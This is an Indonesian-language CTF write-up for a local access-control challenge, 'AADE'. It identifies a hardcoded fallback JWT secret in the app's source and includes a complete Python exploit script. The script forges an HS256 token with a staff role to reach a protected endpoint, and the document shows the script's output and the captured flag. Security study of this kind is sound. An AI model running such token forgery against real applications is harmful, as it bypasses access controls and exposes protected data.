# WriteUp: AADE (Ada Apa Dengan Eden?)

## Overview

* **Judul:** AADE
* **Kategori:** Access Control
* **Poin:** 250
* **Deskripsi:** Ada Apa Dengan Eden?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `eden-academy.yml`. Source code utama (`app.js`) didapatkan melalui ekstraksi dari container Docker.

**Struktur Direktori:**

```bash
.
├── eden-academy.yml
└── exploit.py

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

```bash
PWN=WanZKey docker compose -f eden-academy.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Berdasarkan analisis file `app.js` yang diekstrak dari container, aplikasi menggunakan JSON Web Token (JWT) untuk manajemen sesi. Ditemukan kerentanan konfigurasi yang fatal.

**Vulnerability: Weak Secret Key**
Pada `app.js`, kunci rahasia untuk menandatangani (sign) token JWT didefinisikan secara hardcoded jika environment variable tidak diset.

```javascript
const SECRET_KEY = process.env.SECRET_KEY || "wakuwaku";

```

Karena kita mengetahui `SECRET_KEY` adalah `"wakuwaku"`, kita dapat memalsukan (forge) token JWT sendiri.

**Access Control Logic:**
Endpoint `/staff/records` dilindungi oleh pengecekan role di dalam token JWT.

```javascript
app.get('/staff/records', (req, res) => {
    // ... verify token ...
    if (decoded.role === 'eden_staff') {
        // Show Flag
    } else {
        // 403 Forbidden
    }
});

```

### 3. Exploitation Strategy (JWT Forgery)

Tujuannya adalah membuat token JWT valid yang memiliki `role` sebagai `eden_staff`.

1. **Payload:** `{ "username": "wanzkey", "role": "eden_staff" }`.
2. **Algorithm:** `HS256` (sesuai kode `app.js`).
3. **Secret Key:** `wakuwaku`.
4. **Attack:** Generate token, lalu kirim sebagai cookie `session` ke endpoint `/staff/records`.

## Script Solver

Script Python untuk melakukan forging token JWT dan mengambil flag.

**File:** `exploit.py`

```python
import requests
import jwt # pip install pyjwt

# Target URL
BASE_URL = "http://localhost:1337"
# Secret Key yang bocor di source code
SECRET_KEY = "wakuwaku"

def exploit():
    print(f"[*] Target: {BASE_URL}")
    print("[*] Vulnerability: Weak JWT Secret Key")
    
    # 1. Forge JWT Token (Role: eden_staff)
    payload = {
        "username": "wanzkey",
        "role": "eden_staff"  # Target Role Admin
    }
    
    # Encode JWT pake HS256 dan secret 'wakuwaku'
    forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    print(f"[*] Forged Token: {forged_token}")
    
    # 2. Kirim Request ke Restricted Endpoint
    cookies = {'session': forged_token}
    
    print("[*] Accessing /staff/records with forged token...")
    try:
        r = requests.get(f"{BASE_URL}/staff/records", cookies=cookies)
        
        # 3. Cari Flag
        if r.status_code == 200:
            if "pwn{" in r.text:
                import re
                flag = re.search(r'pwn\{.*?\}', r.text)
                print("-" * 50)
                if flag:
                    print(f"[!!!] JACKPOT! FLAG: {flag.group(0)}")
                else:
                    print(f"[!!!] JACKPOT! Raw content:\n{r.text}")
                print("-" * 50)
            else:
                print("[-] Login sukses, tapi flag tidak ditemukan.")
        else:
            print(f"[-] Access Denied. Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Access Control/AADE]
└─$ ./exploit.py
[*] Target: http://localhost:1337
[*] Vulnerability: Weak JWT Secret Key
[*] Forged Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndhbnprZXkiLCJyb2xlIjoiZWRlbl9zdGFmZiJ9.NwNgjRty1mBPjZbkxpm3kHBwNvaOBptRGNSPnWzVo80
[*] Accessing /staff/records with forged token...
--------------------------------------------------
[!!!] JACKPOT! FLAG: pwn{e8379e2615ea2410f75893f239125a51}
--------------------------------------------------

```

## Flag

```
pwn{e8379e2615ea2410f75893f239125a51}

```
